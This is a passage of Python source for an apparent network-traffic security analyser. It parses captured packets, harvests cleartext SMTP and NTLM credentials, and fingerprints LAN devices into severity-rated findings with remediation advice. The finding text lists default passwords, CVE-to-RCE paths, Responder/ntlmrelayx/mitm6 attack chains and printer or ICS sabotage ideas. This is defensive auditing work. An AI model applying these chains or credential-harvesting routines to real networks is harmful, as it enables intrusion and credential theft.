            for m in re.finditer(r"AUTH\s+(PLAIN|LOGIN)\s+([A-Za-z0-9+/=]+)", text, re.IGNORECASE):
                try:
                    decoded = base64.b64decode(m.group(2), validate=False).decode("utf-8", errors="replace")
                    self._add_credential(src, dst, dport, f"SMTP-AUTH-{m.group(1).upper()}",
                                         extra=decoded[:120])
                    self._add_finding("critical", "cleartext-creds",
                        "SMTP AUTH credentials captured",
                        f"SMTP AUTH {m.group(1).upper()} to {dst}:{dport} — base64 decoded.",
                        hosts=[src, dst], port=dport, evidence=decoded[:120],
                        remediation="Require STARTTLS or SMTPS; disable AUTH on plain SMTP.",
                        key=("smtp-auth", src, dst))
                except Exception:
                    pass

        if dport == 5900 or sport == 5900:
            if b"RFB 003.00" in payload[:16] or b"RFB 003.00" in payload[:32]:
                self._add_finding("high", "plaintext-protocol",
                    "Legacy VNC protocol handshake",
                    f"Legacy RFB 3.x handshake {src} ↔ {dst}:5900. Challenge-response is DES-based and weak; offline cracking trivial.",
                    hosts=[src, dst], port=5900,
                    remediation="Tunnel VNC over SSH or use a modern remote-access solution.",
                    key=("vnc-legacy", src, dst))

        if dport in (1433, 3306, 5432, 6379, 11211, 27017):
            svc_map = {1433: "MSSQL", 3306: "MySQL", 5432: "Postgres",
                       6379: "Redis", 11211: "Memcached", 27017: "MongoDB"}
            self._add_finding("high", "plaintext-protocol",
                f"Cleartext {svc_map[dport]} traffic",
                f"{svc_map[dport]} between {src} and {dst}:{dport} not wrapped in TLS. Queries and auth handshake are sniffable.",
                hosts=[src, dst], port=dport,
                remediation="Enable TLS on the DB, or require VPN/private-subnet-only access.",
                key=("db-plain", dst, dport))

    def _d_arp(self, pkt):
        if ARP not in pkt:
            return
        a = pkt[ARP]
        if a.psrc and a.hwsrc:
            self.arp_table[a.psrc].add(a.hwsrc.lower())
            try:
                self._get_host(a.psrc)["mac"] = a.hwsrc.lower()
            except Exception:
                pass

    def _d_device_recon(self, ip, h):
        """Map identity + listening ports → device-specific exposure findings.

        Runs in _finalize() after vendor/device_type/ssdp_server/dhcp_vendor_class
        are populated. Each finding fires under the 'device-exposure' category so
        the attack-path recipes below can target them with substring matches.
        """
        # Skip pseudo-hosts and public IPs (these checks are for LAN-side gear).
        if h.get("is_multicast") or ip in ("0.0.0.0", "255.255.255.255", "::"):
            return
        if not h.get("is_private"):
            return

        vendor = (h.get("vendor") or "")
        dtype  = (h.get("device_type") or "")
        srv    = (h.get("ssdp_server") or "")
        dvc    = (h.get("dhcp_vendor_class") or "").lower()
        ports  = h.get("ports_listening") or set()
        srvL   = srv.lower()

        def fire(sev, title, desc, evidence=None, rem=None, key=None):
            self._add_finding(sev, "device-exposure", title, desc,
                              hosts=[ip], evidence=evidence,
                              remediation=rem,
                              key=key or ("dev-exp", title, ip))

        # --- routers / residential gateways / mesh nodes ---
        if dtype in ("router", "router-or-mesh", "modem-gateway", "embedded-admin-ui",
                     "dns-or-router", "router-or-ap") or "minimupnpd" in srvL or "internetgatewaydevice" in srvL:
            admin = sorted(ports & {80, 443, 8080, 8443, 8000, 8888, 7547})
            if admin:
                fire("high",
                     f"Router admin plane reachable on {ip}",
                     f"{ip} ({vendor or 'unknown vendor'}) exposes admin/HTTP on {','.join(f':{p}' for p in admin)}. "
                     f"Default-cred + known-CVE territory on consumer ISP gear.",
                     evidence=f"vendor={vendor} ports={admin}",
                     rem="Restrict admin UI to LAN-mgmt VLAN; rotate the default admin password.",
                     key=("dev-router-admin", ip))

        # --- set-top boxes (Zenterio/Telus pattern) ---
        if (dtype == "stb"
            or "zss/" in srvL or "dial-multiscreen" in srvL
            or "uiw" in dvc or "telus" in dvc):
            fire("medium",
                 f"Set-top box detected at {ip}",
                 f"STB/DIAL receiver — DIAL spec accepts unauthenticated app-launch POSTs; "
                 f"GENA SUBSCRIBE CALLBACK is a common SSRF pivot; the boot-portal URL is "
                 f"often plain HTTP and DHCP option 40 (upgrade-url) hijackable.",
                 evidence=f"vendor={vendor} server={srv} dhcp_class={h.get('dhcp_vendor_class')}",
                 rem="Audit the firmware: confirm signed updates, TLS pinning on portal URLs, "
                     "and that DIAL launch endpoints validate Origin.",
                 key=("dev-stb", ip))

        # --- printers ---
        if dtype == "printer" or 9100 in ports or 631 in ports or 515 in ports or 631 in ports:
            present = sorted(ports & {9100, 631, 515, 80, 443, 23})
            fire("high",
                 f"Printer with management/print ports on {ip}",
                 f"{vendor or 'printer'} exposes {','.join(f':{p}' for p in present)}. "
                 f"9100/JetDirect + IPP + telnet legacies → PJL/PostScript injection, "
                 f"address-book exfil, captured print jobs.",
                 evidence=f"vendor={vendor} ports={present}",
                 rem="ACL the printer; require IPP-over-TLS only; rotate admin web password.",
                 key=("dev-printer", ip))

        # --- IP cameras (Hikvision SDK 8000, Dahua 37777/37778, generic RTSP 554) ---
        if (8000 in ports and 80 in ports) or "hikvision" in srvL:
            fire("critical",
                 f"Hikvision-pattern IP camera on {ip}",
                 f"Port 8000 + 80 + 554 = Hikvision SDK/HTTP/RTSP. Default admin / 12345; "
                 f"CVE-2017-7921 unauth config download.",
                 evidence=f"ports={sorted(ports & {8000, 80, 443, 554})}",
                 rem="Force-change default; firmware ≥ 2017-04 for CVE-2017-7921; "
                     "isolate cameras to a VLAN with no LAN/Internet egress.",
                 key=("dev-cam-hik", ip))
        if 37777 in ports or 37778 in ports or "dahua" in srvL:
            fire("critical",
                 f"Dahua-pattern IP camera on {ip}",
                 f"Port 37777/37778 = Dahua DVRIP. CVE-2021-33044/33045 auth bypass; "
                 f"default 888888/888888 / 666666/666666.",
                 evidence=f"ports={sorted(ports & {37777, 37778, 80, 554})}",
                 rem="Patch to current firmware; restrict 37777 to NVR subnet only.",
                 key=("dev-cam-dahua", ip))
        if 554 in ports and dtype != "voip":
            fire("medium",
                 f"RTSP service on {ip}",
                 f"RTSP often serves video without auth (or with weak digest). "
                 f"Probe with `ffprobe rtsp://{ip}/live` to confirm a stream is reachable.",
                 evidence=f"ports={sorted(ports & {554, 8554, 80})}",
                 rem="Require auth on every RTSP path; better: TLS-wrapped RTSPS.",
                 key=("dev-rtsp", ip))

        # --- VoIP / SIP ---
        if 5060 in ports or 5061 in ports or dtype == "voip":
            fire("high",
                 f"SIP/VoIP endpoint on {ip}",
                 f"SIP REGISTER/INVITE is unauth-discoverable; weak digest auth → SIPVicious "
                 f"crack; misconfigured PBX → toll fraud (calls billed to victim's account).",
                 evidence=f"vendor={vendor} ports={sorted(ports & {5060, 5061, 80, 443})}",
                 rem="Require TLS-SIP (5061) + SRTP; geo-fence allowed SIP peers; rate-limit "
                     "INVITEs at the SBC.",
                 key=("dev-voip", ip))

        # --- TR-069 / CWMP exposed (residential gateway management) ---
        if 7547 in ports or 30005 in ports:
            fire("critical",
                 f"TR-069 / CWMP ACS port on {ip}",
                 f"TCP/7547 exposed (Mirai-class). NewNTPServer/SetParameterValues command "
                 f"injection (CVE-2016-10372 et al.) → RCE on the gateway.",
                 evidence=f"port=7547",
                 rem="Restrict 7547 to the ISP's ACS source IP only; patch firmware.",
                 key=("dev-cwmp", ip))

        # --- MQTT (IoT broker) ---
        if 1883 in ports or 8883 in ports:
            fire("high",
                 f"MQTT broker on {ip}",
                 f"Default Mosquitto/HiveMQ allows anonymous CONNECT. Topic subscribe = "
                 f"every device's telemetry; topic publish = control.",
                 evidence=f"ports={sorted(ports & {1883, 8883})}",
                 rem="Disable anonymous_access; require client cert auth on 8883.",
                 key=("dev-mqtt", ip))

        # --- Chromecast / DIAL / Google Cast (TLS 8009, HTTP 8008) ---
        if 8008 in ports or 8009 in ports:
            fire("medium",
                 f"Chromecast / Google Cast device at {ip}",
                 f"Cast accepts app-launch over local mDNS+HTTP — CSRF from any "
                 f"webpage on the same LAN (CastHack 2014/2018). Receivers also load "
                 f"unsigned manifest URLs.",
                 evidence=f"ports={sorted(ports & {8008, 8009})}",
                 rem="Cast guest-mode off if not needed; isolate cast targets to media VLAN.",
                 key=("dev-cast", ip))

        # --- IPMI BMC ---
        if 623 in ports:
            fire("critical",
                 f"IPMI BMC exposed on {ip}",
                 f"Port 623 = IPMI 2.0. RAKP+1 hash crack (mode 7300) yields root on the BMC "
                 f"which yields KVM + virtual-media boot → host pwn.",
                 evidence="port=623",
                 rem="Move BMC to dedicated mgmt VLAN; disable cipher 0 / cipher 1; rotate "
                     "default root password.",
                 key=("dev-ipmi", ip))

        # --- NAS (Synology / QNAP) ---
        if dtype == "nas" or vendor in ("Synology", "QNAP"):
            fire("high",
                 f"NAS appliance ({vendor or 'unknown'}) at {ip}",
                 f"Synology/QNAP have a long CVE history: DSM HTTP RCEs, photo-station "
                 f"command injection, QSnatch/QLocker mass-targeting families.",
                 evidence=f"vendor={vendor} ports={sorted(ports & {5000, 5001, 8080, 8443, 80, 443, 873, 548, 445})}",
                 rem="Patch to current OS; expose only over VPN; rotate admin password; "
                     "disable myQNAPcloud / QuickConnect unless required.",
                 key=("dev-nas", ip))

        # --- TFTP server (legacy config/firmware pull) ---
        if 69 in ports:
            fire("high",
                 f"TFTP server on {ip}",
                 f"UDP/69 TFTP = unauth read/write of router/switch/IP-phone configs "
                 f"and firmware. Common on enterprise networks for config backup.",
                 evidence="port=69",
                 rem="Block TFTP at the edge; for legacy config-pull use SCP instead.",
                 key=("dev-tftp", ip))

        # --- WPS-capable radio (Quantenna chip in Telus mesh, etc.) ---
        if vendor == "Quantenna" or "wfadevice" in srvL or "wfawlanconfig" in srvL:
            fire("high",
                 f"Wi-Fi radio with WPS service at {ip}",
                 f"WPS PIN attacks (Pixie-Dust, Reaver) recover the WPA passphrase from "
                 f"a single ~2 s online handshake on vulnerable chipsets.",
                 evidence=f"vendor={vendor} server={srv}",
                 rem="Disable WPS in the AP admin UI; if not possible, replace the AP.",
                 key=("dev-wps", ip))

        # --- Smart speaker / TV with HTTP control ---
        if vendor in ("Sonos", "Roku") and (1400 in ports or 8060 in ports):
            fire("low",
                 f"Smart media device ({vendor}) at {ip}",
                 f"Roku ECP (8060) / Sonos UPnP (1400) accept unauth commands on LAN: "
                 f"channel/volume control, playback, queue manipulation. Not RCE — but "
                 f"useful pivot for proximity confirmation / OPSEC denial.",
                 evidence=f"ports={sorted(ports & {1400, 8060, 8009, 8008, 5353})}",
                 rem="Segregate media VLAN; default DHCP on a separate SSID.",
                 key=("dev-media", ip))

        # --- smart TV (webOS / Tizen / Vizio / Roku TV) ---
        if (dtype in ("tv", "tv-or-appliance", "tv-or-console")
            or vendor in ("LG", "Samsung", "Vizio", "Sony")
            and any(p in ports for p in (1925, 9197, 7000, 8060, 8001, 8002, 55000))):
            fire("high",
                 f"Smart TV ({vendor or 'unknown'}) at {ip}",
                 f"Smart TV stacks (webOS, Tizen, Vizio SmartCast, Android TV) ship "
                 f"old Chromium/WebKit and DIAL/HbbTV apps with little CSRF/CORS hygiene. "
                 f"LAN-CSRF can drive the TV; some firmware exposes shell debug ports.",
                 evidence=f"vendor={vendor} ports={sorted(ports & {1925, 8001, 8002, 9197, 7000, 8060, 55000})}",
                 rem="Disconnect TV from primary LAN; isolate to a media VLAN with no "
                     "egress to user devices; install vendor firmware updates promptly.",
                 key=("dev-tv", ip))

        # --- AirPlay receiver / Apple TV ---
        if 7000 in ports or 7100 in ports or "_airplay" in srvL:
            fire("medium",
                 f"AirPlay receiver at {ip}",
                 f"AirPlay 1 / 2 receivers (Apple TV, third-party speakers, modern TVs) "
                 f"accept unauth media-push on LAN by default. CVE-2021-30892 / -30877 "
                 f"old-Bonjour bugs are network-reachable.",
                 evidence=f"ports={sorted(ports & {7000, 7100, 49152, 5000})}",
                 rem="Require AirPlay password on each receiver; restrict to a Wi-Fi "
                     "guest network; firmware ≥ tvOS 15.1.",
                 key=("dev-airplay", ip))

        # --- Plex Media Server ---
        if 32400 in ports:
            fire("high",
                 f"Plex Media Server on {ip}",
                 f"Port 32400 is Plex. CVE-2020-5740 deserialization → RCE; CVE-2023-25193 "
                 f"plex relay token exposure; default install accepts the Plex.tv account "
                 f"that registered the server (so the cloud-account compromise pivots in).",
                 evidence="port=32400",
                 rem="Patch to the latest build; require Plex Pass + per-server PIN; "
                     "disable 'remote access' if not needed.",
                 key=("dev-plex", ip))

        # --- 3D printer / OctoPrint / Mainsail / Klipper ---
        if (5000 in ports and 80 not in ports) or 7125 in ports or 7136 in ports or "octoprint" in srvL:
            fire("high",
                 f"3D-printer controller (OctoPrint/Klipper) on {ip}",
                 f"OctoPrint/Klipper/Moonraker REST APIs ship with no auth by default. "
                 f"G-code upload + start-print is whatever the printer can do — "
                 f"thermal-runaway sabotage is realistic if checks are off.",
                 evidence=f"ports={sorted(ports & {5000, 7125, 7136, 80})}",
                 rem="Enable access control in OctoPrint; require API key for Moonraker; "
                     "keep firmware thermal-runaway protection on.",
                 key=("dev-octoprint", ip))

        # --- Philips Hue / Lutron Caseta / smart-light hub ---
        if "hue" in srvL or 4080 in ports or "_hue._tcp" in srvL or "lutron" in srvL or "caseta" in srvL:
            fire("medium",
                 f"Smart-light hub ({vendor or 'unknown'}) at {ip}",
                 f"Philips Hue/Lutron Caseta hubs expose a local REST API; for Hue, a "
                 f"single physical button press creates an authorized user — but "
                 f"timing-bug / brute attacks have surfaced.",
                 evidence=f"vendor={vendor} server={srv}",
                 rem="Patch firmware; if mDNS leaks the hub to guest Wi-Fi, isolate it.",
                 key=("dev-light-hub", ip))

        # --- Network UPS / NUT (Network UPS Tools) ---
        if 3493 in ports:
            fire("medium",
                 f"Network UPS server (NUT) on {ip}",
                 f"NUT on tcp/3493 — `upsc <ups>@<host>` reads status without auth; "
                 f"`upscmd` can shut the UPS down (and the load) with a captured "
                 f"low-priv password.",
                 evidence="port=3493",
                 rem="Restrict 3493 to monitoring host; require auth on upscmd.",
                 key=("dev-nut", ip))

        # --- APC Network Management Card (NMC) / Eaton ePDU ---
        if (vendor in ("APC", "Eaton") and (80 in ports or 443 in ports)) or "apc network management" in srvL:
            fire("high",
                 f"APC/Eaton power management card on {ip}",
                 f"NMC default `apc/apc` admin; SNMP RW `private` very common. Once in: "
                 f"`outlet off` cuts power, scheduled power-cycles disable services.",
                 evidence=f"vendor={vendor} ports={sorted(ports & {22, 23, 80, 161, 443})}",
                 rem="Rotate APC default; SNMPv3-authpriv only; segregate the power "
                     "management plane onto a mgmt VLAN.",
                 key=("dev-pdu", ip))

        # --- PJLink network projector ---
        if 4352 in ports:
            fire("medium",
                 f"PJLink projector control on {ip}",
                 f"PJLink (port 4352) protocol is plaintext command/response. Default "
                 f"password is empty or 'default' on most makes (Epson, NEC, Panasonic, "
                 f"Sony, ViewSonic). Power on/off, source switch, freeze, fade-to-black.",
                 evidence="port=4352",
                 rem="Rotate the PJLink password; restrict to AV control VLAN.",
                 key=("dev-pjlink", ip))

        # --- Wireless presentation (Barco ClickShare / Mersive Solstice / Crestron AirMedia) ---
        if (dtype == "embedded-admin-ui" and vendor in ("Barco", "Mersive", "Crestron")) \
                or "clickshare" in srvL or "solstice" in srvL or "airmedia" in srvL:
            fire("high",
                 f"Wireless presentation device ({vendor or 'unknown'}) at {ip}",
                 f"ClickShare / Solstice / AirMedia ship admin web UIs with vendor "
                 f"defaults. CVE-2019-18827 / -18828 (Barco ClickShare) cred exposure; "
                 f"Solstice admin web → guest-network creds + corp Wi-Fi PSK in plain.",
                 evidence=f"vendor={vendor} server={srv}",
                 rem="Rotate the device's admin password; disable the unprotected wired "
                     "admin port; apply latest firmware.",
                 key=("dev-wp", ip))

        # --- Crestron Control / AMX commercial AV ---
        if 41794 in ports or 41795 in ports:
            fire("high",
                 f"Crestron control processor on {ip}",
                 f"Ports 41794/41795 are the Crestron CIP/Toolbox channels. Many "
                 f"installations leave default `admin` with no password — full room "
                 f"automation control (HVAC, blinds, displays).",
                 evidence=f"ports={sorted(ports & {41794, 41795, 80, 443, 22, 23})}",
                 rem="Set an admin password; disable Toolbox port if not used; "
                     "segregate AV processor to its own VLAN.",
                 key=("dev-crestron", ip))

        # --- DLNA media server (generic UPnP MediaServer) ---
        if "mediaserver" in srvL or "dlna" in srvL or 8200 in ports or 32469 in ports:
            fire("low",
                 f"DLNA media server at {ip}",
                 f"UPnP MediaServer indexes shared content without auth. Often hosts "
                 f"family-private content; some implementations (miniDLNA <1.1.5) had "
                 f"path traversal that exposed arbitrary files (CVE-2020-12695).",
                 evidence=f"server={srv} ports={sorted(ports & {8200, 32469, 80})}",
                 rem="Patch miniDLNA; bind to LAN-only addresses; restrict shared "
                     "directories to media-only folders.",
                 key=("dev-dlna", ip))

        # --- IoT hub (SmartThings, Hubitat, Wink, Vera, Home Assistant) ---
        if ((8080 in ports or 8123 in ports or 39500 in ports)
            and ("home_assistant" in srvL or "smartthings" in srvL or "hubitat" in srvL
                 or "wink" in srvL or vendor in ("Samsung", "Wink", "Hubitat"))):
            fire("high",
                 f"Smart-home hub ({vendor or 'unknown'}) at {ip}",
                 f"Smart-home hubs aggregate every IoT device on the LAN. API tokens "
                 f"and stored cloud-account creds make the hub the highest-value LAN "
                 f"pivot. CVE-2022-3859 / Home Assistant supervisor auth bypass class.",
                 evidence=f"vendor={vendor} ports={sorted(ports & {8080, 8123, 39500, 443, 80})}",
                 rem="Enable hub-side admin password; isolate hub VLAN; keep vendor "
                     "firmware current.",
                 key=("dev-iot-hub", ip))

        # --- EV charger (OCPP WebSocket) / smart energy meter ---
        if 9000 in ports and ("ocpp" in srvL or "chargepoint" in srvL or "easee" in srvL
                              or "wallbox" in srvL or vendor in ("ChargePoint", "Wallbox", "Easee")):
            fire("high",
                 f"EV charger (OCPP) at {ip}",
                 f"OCPP 1.6/2.0.1 over WebSocket on tcp/9000. Often deployed without "
                 f"TLS or token auth, vulnerable to remote start/stop transaction + "
                 f"meter manipulation (free charging fraud).",
                 evidence=f"vendor={vendor} server={srv}",
                 rem="Require OCPP-J over TLS with mutual auth; isolate charger LAN.",
                 key=("dev-ev", ip))

        # --- Solar inverter / energy monitor (SMA SunnyBoy, Fronius, Enphase Envoy) ---
        if (vendor in ("SMA", "Fronius", "Enphase") and 80 in ports) or 9522 in ports or "fronius" in srvL or "envoy" in srvL or "sma " in srvL:
            fire("medium",
                 f"Solar inverter / energy monitor ({vendor or 'unknown'}) at {ip}",
                 f"SMA SunnyBoy / Fronius Symo / Enphase Envoy web UIs default to "
                 f"`installer` / vendor PIN derived from serial. SMA Speedwire on "
                 f"UDP/9522 broadcasts grid stats unauth.",
                 evidence=f"vendor={vendor} ports={sorted(ports & {80, 443, 9522})}",
                 rem="Rotate installer PIN; firewall the inverter to the monitoring "
                     "host; firmware patches.",
                 key=("dev-solar", ip))

        # --- Game console (PS5/PS4, Xbox) — UPnP/DLNA punch-out signal ---
        if vendor in ("Sony", "Microsoft", "Nintendo") and (3074 in ports or 9293 in ports):
            fire("low",
                 f"Game console ({vendor}) at {ip}",
                 f"Consoles aggressively use UPnP IGD to punch WAN ports inbound — "
                 f"if the gateway honors it, the home network gets an unintended "
                 f"WAN-facing chat/voice service. CVE-class but mostly recon-grade.",
                 evidence=f"vendor={vendor} ports={sorted(ports & {3074, 9293, 5223, 80})}",
                 rem="Disable UPnP on the gateway; rely on manual port-forwards.",
                 key=("dev-console", ip))

        # --- CCTV NVR / DVR distinct from camera (Hikvision NVR Web/SDK, Dahua NVR) ---
        if (8000 in ports and 80 in ports and 554 in ports and 37777 not in ports
            and 8554 in ports) or "iVMS" in srv or "DSS" in srv:
            fire("high",
                 f"Surveillance NVR/DVR at {ip}",
                 f"NVR/DVRs aggregate every camera's stream and credentials. Same CVE "
                 f"families as the cameras themselves (Hikvision SDK / Dahua DVRIP) plus "
                 f"often a Linux shell on the management port.",
                 evidence=f"vendor={vendor} ports={sorted(ports & {8000, 80, 554, 8554, 37777, 22, 23})}",
                 rem="Patch the NVR firmware; force a unique strong password; "
                     "VLAN segregate cameras + NVR from user/internet.",
                 key=("dev-nvr", ip))

        # --- ICS / OT direct controllers (re-emit under device-exposure for the playbook chain) ---
        ot_ports = {502:"Modbus", 102:"S7", 20000:"DNP3", 2404:"IEC-104",
                    44818:"EtherNet/IP", 47808:"BACnet", 4840:"OPC-UA",
                    9600:"Omron FINS"}
        ot_hit = {p: ot_ports[p] for p in ports if p in ot_ports}
        if ot_hit:
            fire("critical",
                 f"ICS/OT controller at {ip} — {', '.join(ot_hit.values())}",
                 f"Industrial protocol with no auth by design. Modbus/S7/DNP3 grant "
                 f"READ and WRITE — actuating in production can injure people.",
                 evidence=", ".join(f"{p}={n}" for p, n in ot_hit.items()),
                 rem="OT segment behind a one-way data diode; never expose to the IT VLAN.",
                 key=("dev-ot", ip))

    def _d_dns_response(self, src, dport, dns):
        """Harvest hostnames from DNS / mDNS responses.

        A-record  with name X. -> X advertises ownership of the resolved IP.
        AAAA same. PTR responses give rDNS for the queried address.
        We populate mdns_local_name for LAN IPs and rdns_name for any IP.
        """
        if DNSRR is None:
            return
        is_mdns = dport == 5353
        for section in (dns.an, dns.ar):
            rr = section
            while rr:
                try:
                    rtype = int(getattr(rr, "type", 0))
                    rname = rr.rrname.decode("utf-8", errors="replace").rstrip(".") if rr.rrname else None
                    rdata = rr.rdata
                except Exception:
                    rr = rr.payload if hasattr(rr, "payload") else None
                    continue
                # A / AAAA: rname owns the IP in rdata.
                if rtype in (1, 28) and isinstance(rdata, str) and rname:
                    try:
                        ip = rdata
                        h = self._get_host(ip)
                        if is_mdns and rname.endswith(".local") and not h.get("mdns_local_name"):
                            # ".local" mDNS hostnames are device-claimed names.
                            h["mdns_local_name"] = rname[:-len(".local")] if rname.endswith(".local") else rname
                        if not is_mdns and not h.get("rdns_name"):
                            h["rdns_name"] = rname
                    except Exception:
                        pass
                # PTR: reverse lookup — rdata is the hostname, rname encodes the IP.
                elif rtype == 12 and rname and isinstance(rdata, (str, bytes)):
                    try:
                        name = rdata.decode("utf-8", errors="replace") if isinstance(rdata, (bytes, bytearray)) else str(rdata)
                        name = name.rstrip(".")
                        ip = None
                        if rname.endswith(".in-addr.arpa"):
                            parts = rname[:-len(".in-addr.arpa")].split(".")
                            if len(parts) == 4:
                                ip = ".".join(reversed(parts))
                        if ip:
                            h = self._get_host(ip)
                            if not h.get("rdns_name"):
                                h["rdns_name"] = name
                        # mDNS service PTR like _airplay._tcp.local → MyTV._airplay._tcp.local
                        # also marks the SRC host as having that friendly name.
                        if is_mdns and name and "._" not in rname and rname.endswith(".local"):
                            sh = self._get_host(src)
                            if not sh.get("mdns_local_name"):
                                sh["mdns_local_name"] = name
                    except Exception:
                        pass
                rr = rr.payload if hasattr(rr, "payload") else None

    def _d_dhcp(self, pkt, src):
        """Pull DHCP option 12 (hostname) and option 60 (vendor class id)."""
        if BOOTP is None or DHCP is None or BOOTP not in pkt or DHCP not in pkt:
            return
        # client MAC from BOOTP chaddr — useful when src IP is 0.0.0.0 (DISCOVER)
        try:
            chaddr = bytes(pkt[BOOTP].chaddr)[:6]
            client_mac = ":".join(f"{b:02x}" for b in chaddr)
        except Exception:
            client_mac = None
        opts = pkt[DHCP].options or []
        hostname = None
        vendor_class = None
        is_client = False
        for o in opts:
            if not isinstance(o, tuple) or not o:
                continue
            k = o[0]
            v = o[1] if len(o) > 1 else None
            if k == "hostname" and v:
                try: hostname = v.decode("utf-8", errors="replace") if isinstance(v, (bytes, bytearray)) else str(v)
                except Exception: hostname = None
            elif k == "vendor_class_id" and v:
                try: vendor_class = v.decode("utf-8", errors="replace") if isinstance(v, (bytes, bytearray)) else str(v)
                except Exception: vendor_class = None
            elif k == "message-type" and v in (1, 3, 8):
                is_client = True  # DISCOVER/REQUEST/INFORM come from the client
        # Attribute to source IP if routable; else to the client MAC's host record (best-effort).
        target_ip = src if (src and src != "0.0.0.0") else None
        if target_ip:
            h = self._get_host(target_ip)
            if hostname and not h.get("dhcp_hostname"):
                h["dhcp_hostname"] = hostname
            if vendor_class and not h.get("dhcp_vendor_class"):
                h["dhcp_vendor_class"] = vendor_class
            if client_mac and not h.get("mac"):
                h["mac"] = client_mac
        elif client_mac:
            # 0.0.0.0 case — stash for later (a host record may appear once it gets a lease).
            self._dhcp_by_mac[client_mac] = {
                "hostname": hostname, "vendor_class": vendor_class,
            }

    def _d_name_resolution(self, src, dst, dport, payload):
        if dport == 5355:
            self._add_finding("high", "spoofable-resolution",
                "LLMNR queries observed",
                f"{src} performs LLMNR name resolution. Responder/Inveigh can trivially answer these "
                f"and harvest NetNTLMv2 hashes for offline cracking or NTLM relay.",
                hosts=[src], port=5355,
                remediation="Disable LLMNR via GPO (Computer Config → Admin Templates → Network → DNS Client → Turn off multicast name resolution).",
                key=("llmnr", src))
        elif dport == 137:
            qname = None
            if payload and len(payload) >= 14:
                try:
                    enc = payload[13:45]
                    dec = bytes(((enc[i] - 0x41) << 4) | (enc[i+1] - 0x41)
                                for i in range(0, min(32, len(enc) - 1), 2))
                    qname = dec.rstrip(b"\x00 ").decode("ascii", errors="replace")
                except Exception:
                    qname = None
            self._add_finding("high", "spoofable-resolution",
                "NBT-NS queries observed",
                f"{src} performs NetBIOS name-service broadcasts. Poison with Responder (-I iface) "
                f"to capture NetNTLMv2 challenge/response.",
                hosts=[src], port=137,
                evidence=f"name={qname}" if qname else None,
                remediation="Disable NetBIOS over TCP/IP on all adapters (GPO / adapter settings).",
                key=("nbns", src))
            if qname and qname.upper().startswith("WPAD"):
                self._add_finding("critical", "spoofable-resolution",
                    "WPAD lookup via NBT-NS",
                    f"{src} is broadcasting for WPAD. Classic NTLM-relay foothold: Responder -r "
                    f"→ ntlmrelayx → SMB or LDAP relay.",
                    hosts=[src], port=137, evidence=qname,
                    remediation="Create an authoritative internal WPAD DNS entry pointing to a dead IP or disable WinHTTP auto-proxy.",
                    key=("wpad-nbns", src))
            # NBT-NS name registration / refresh queries reveal the host's own NetBIOS name.
            # Filter out wildcard / empty registrations ("*"/blank) and the broadcast WORKGROUP name.
            if qname:
                name = qname.strip().rstrip("$").rstrip("\x00")
                if name and name != "*" and name != "\x01\x02__MSBROWSE__\x02":
                    h = self._get_host(src)
                    if not h.get("nbns_name"):
                        h["nbns_name"] = name
        elif dport == 5353:
            self._add_finding("medium", "spoofable-resolution",
                "mDNS queries observed",
                f"{src} uses multicast DNS on the local segment. Same-subnet attacker can impersonate services.",
                hosts=[src], port=5353,
                remediation="Disable mDNS/Bonjour on enterprise endpoints.",
                key=("mdns", src))

    def _d_dhcpv6(self, src, dst):
        if ":" not in dst:
            return
        if dst.lower().startswith("ff02::1:2"):
            self._add_finding("critical", "ipv6-takeover",
                "DHCPv6 solicit observed (mitm6 target)",
                f"{src} is soliciting DHCPv6. An attacker running mitm6 can become the primary IPv6 "
                f"DNS, poison WPAD, and chain into ntlmrelayx for full AD takeover.",
                hosts=[src], port=547,
                remediation="Disable IPv6 on clients that don't need it, or block DHCPv6 / RA at the switch.",
                key=("dhcpv6", src))

    def _d_icmpv6_ra(self, pkt, src):
        if ICMPv6ND_RA is not None and ICMPv6ND_RA in pkt:
            self._add_finding("high", "ipv6-takeover",
                "IPv6 router advertisement observed",
                f"RA from {src}. If this is not a trusted gateway, a rogue RA gives an attacker "
                f"default-route and DNS control (SLAAC attack).",
                hosts=[src],
                remediation="Enable RA Guard on access switches; lock down IPv6 RA to authorized routers.",
                key=("ra", src))

    def _d_dns_extras(self, qname, src):
        if not qname:
            return
        low = qname.lower().rstrip(".")
        if low == "wpad" or low.startswith("wpad.") or ".wpad." in low:
            self._add_finding("critical", "spoofable-resolution",
                "WPAD DNS query",
                f"{src} queried DNS for '{qname}'. If WPAD isn't authoritatively blocked, "
                f"Responder/Inveigh can claim it and relay NTLM (ntlmrelayx).",
                hosts=[src], evidence=qname,
                remediation="Create an internal WPAD record that returns NXDOMAIN or a dead IP.",
                key=("wpad-dns", src))
        if low.startswith("isatap.") or low == "isatap":
            self._add_finding("medium", "ipv6-takeover",
                "ISATAP lookup",
                f"{src} queried ISATAP. Legacy IPv6 transition tech — abusable for rogue tunneling.",
                hosts=[src], evidence=qname,
                remediation="Block ISATAP at DNS; disable IPv6 transition protocols if unused.",
                key=("isatap", src))
        label = low.split(".")[0] if "." in low else low
        if len(label) >= 30 and _entropy(label) >= 3.8:
            self._add_finding("medium", "dns-tunnel",
                "High-entropy DNS label (possible tunneling)",
                f"{src} queried '{qname}' — long random-looking subdomain consistent with "
                f"DNS exfil (dnscat2 / iodine / Cobalt Strike DNS beacon).",
                hosts=[src], evidence=qname,
                remediation="Inspect DNS egress; restrict recursive resolvers; log and alert on >30-char labels.",
                key=("dns-tunnel", src, label[:12]))

    def _d_ntlm(self, src, dst, port, payload):
        idx = payload.find(b"NTLMSSP\x00")
        if idx < 0:
            return
        if idx + 12 > len(payload):
            return
        try:
            mtype = struct.unpack_from("<I", payload, idx + 8)[0]
        except Exception:
            return
        if mtype not in (1, 2, 3):
            return
        info = {"src": src, "dst": dst, "port": port, "type": mtype}
        if mtype == 3 and idx + 64 <= len(payload):
            def sec_buf(off):
                ln, _mx, boff = struct.unpack_from("<HHI", payload, idx + off)
                start = idx + boff
                return payload[start:start + ln]
            try:
                lm_resp = sec_buf(12)
                nt_resp = sec_buf(20)
                dom = sec_buf(28)
                user = sec_buf(36)
                host = sec_buf(44)
                flags = struct.unpack_from("<I", payload, idx + 60)[0]
                enc = "utf-16-le" if (flags & 0x00000001) else "latin1"
                domain = dom.decode(enc, errors="replace")
                username = user.decode(enc, errors="replace")
                workstation = host.decode(enc, errors="replace")
                info.update({
                    "user": username, "domain": domain, "workstation": workstation,
                    "nt_resp_len": len(nt_resp), "lm_resp_len": len(lm_resp),
                    "nt_resp_hex": nt_resp.hex(),
                })
                ntlmv2 = len(nt_resp) > 24
                self._add_finding("critical", "ntlm-capture",
